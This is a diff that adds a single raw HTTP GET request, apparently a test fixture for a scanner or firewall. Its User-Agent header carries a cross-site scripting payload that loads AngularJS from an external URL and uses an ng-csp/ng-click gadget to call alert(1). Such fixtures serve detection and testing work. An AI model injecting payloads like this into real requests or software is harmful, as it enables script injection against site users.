@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: <script src="https://example.com/angularjs/1.1.3/angularjs.min.js"><div ng-app ng-csp id=p ng-click=$event.view.alert(1)>
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
